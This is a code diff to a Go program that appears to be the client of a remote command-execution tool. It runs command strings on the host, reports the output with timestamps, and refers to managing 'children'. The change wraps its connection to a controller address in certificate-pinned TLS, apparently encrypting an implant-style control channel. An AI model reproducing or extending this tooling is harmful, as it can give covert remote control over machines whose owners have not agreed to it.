@@ -2,9 +2,13 @@ package main
 
 import (
 	"bufio"
+	"crypto/tls"
+	"crypto/x509"
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io/ioutil"
+	"log"
 	"net"
 	"os"
 	"os/exec"
@@ -21,9 +25,9 @@ var (
 type Results struct {
 	CommandsList []string
 	ID           int
-	//Command string
-	Output string
-	Time   string
+	Command      string
+	Output       string
+	Time         string
 }
 
 // remove ARP
@@ -89,9 +93,10 @@ func executeCommand(checkOS string, commandString string) *Results {
 	//using the Results structure
 	currentTime := getTime()
 	outputTest := &Results{
-		ID:     1, // TODO: need to make this random for multiple children
-		Output: results,
-		Time:   currentTime,
+		ID:      1, // TODO: need to make this random for multiple children
+		Output:  results,
+		Time:    currentTime,
+		Command: commandString,
 	}
 	// jsonMS, _ := json.Marshal(outputTest)
 	return outputTest
@@ -136,8 +141,16 @@ func clientMode() {
 	fmt.Println("###PRINTING TO SCREENONLY FOR DEV PURPOSES###")
 	fmt.Printf("Attempting to connect to %s \n", CONNECT)
 
-	// c, err := tls.Dial("tcp", CONNECT, nil)
-	c, err := net.Dial("tcp", CONNECT)
+	CA_Pool := x509.NewCertPool()
+	severCert, err := ioutil.ReadFile("./openssl/mydomain.com.crt")
+	if err != nil {
+		log.Fatal("Could not load server certificate!")
+	}
+	CA_Pool.AppendCertsFromPEM(severCert)
+
+	config := tls.Config{RootCAs: CA_Pool}
+	c, err := tls.Dial("tcp", CONNECT, &config)
+	// c, err := net.Dial("tcp", CONNECT)
 	if err != nil {
 		fmt.Println(err)
 		return
